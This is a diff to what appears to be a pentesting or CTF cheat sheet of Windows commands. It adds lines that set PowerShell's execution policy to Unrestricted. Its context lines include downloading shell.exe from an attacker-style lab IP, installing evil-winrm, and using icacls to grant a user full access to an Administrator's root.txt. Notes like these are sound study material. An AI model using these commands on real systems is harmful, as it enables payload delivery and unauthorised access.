@@ -163,7 +163,9 @@ powershell Invoke-WebRequest -Uri http://10.10.14.58/shell.exe -OutFile out.yml
 (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
 Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"
 C:\windows\syswow64\windowspowershell\v1.0\powershell
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell 
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+PS C:\WINDOWS\system32> Set-ExecutionPolicy Unrestricted
+PS C:\WINDOWS\system32> Get-ExecutionPolicy
 sudo gem install evil-winrm
 //F for full access on a file:
 icacls C:\Users\Administrator\Desktop\root.txt /grant Alfred:(F)
